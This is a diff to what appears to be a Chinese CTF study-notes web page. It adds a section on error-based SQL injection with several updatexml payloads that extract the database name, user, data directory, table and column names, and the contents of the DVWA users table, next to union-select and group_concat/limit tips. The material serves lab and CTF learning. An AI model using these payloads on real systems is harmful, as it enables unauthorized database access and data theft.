@@ -931,6 +931,13 @@
 <li><p>查询数据：<br> id=0’ union select 1,2,3,skctf_flag from fl4g#<br> 得到flag。</p>
 </li>
 </ol>
+<h3 id="手注变种：报错注入"><a href="#手注变种：报错注入" class="headerlink" title="手注变种：报错注入"></a>手注变种：报错注入</h3><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/c1047509362/p/12806297.html">https://www.cnblogs.com/c1047509362/p/12806297.html</a></p>
+<ol>
+<li><code>1&#39;or(updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1))=&#39;1</code> 爆出数据库</li>
+<li><code>1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))，0x7e),1))=&#39;1</code> 爆当前数据库表信息</li>
+<li><code>1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema=wp_links)and(table_name=&#39;users&#39;)),0x7e),1))=&#39;1</code> 爆user表字段信息</li>
+<li><code>1&#39; and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #</code> 爆数据库内容</li>
+</ol>
 <h3 id="注入各种问题处理方法"><a href="#注入各种问题处理方法" class="headerlink" title="注入各种问题处理方法"></a>注入各种问题处理方法</h3><ol>
 <li>提示输出信息超过一行：使用group_concat,eg:3’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=’test’)),0x7e),1))=’1</li>
 <li>字符串超过group_concat限制，使用limit 0,1单独输出，limit 0,1 表示输出第一个数据。 0表示输出的起始位置，1表示跨度为1（即输出几个数据，1表示输出一个，2就表示输出两个）。<br>ref：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/forwardss/article/details/104682924">https://blog.csdn.net/forwardss/article/details/104682924</a></li>
